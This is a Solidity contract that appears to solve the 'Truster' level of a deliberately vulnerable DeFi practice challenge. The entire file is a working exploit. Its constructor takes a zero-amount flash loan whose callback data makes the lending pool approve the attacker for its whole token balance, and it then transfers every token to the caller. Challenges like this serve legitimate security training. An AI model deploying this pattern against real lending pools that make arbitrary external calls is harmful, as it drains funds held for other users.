// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import { DamnValuableToken, TrusterLenderPool } from "src/03-Truster/TrusterLenderPool.sol";

contract Attack {
    constructor(TrusterLenderPool pool) {
        DamnValuableToken token = pool.token();
        uint256 amount = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSelector(token.approve.selector, address(this), amount);
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), msg.sender, amount);
    }
}
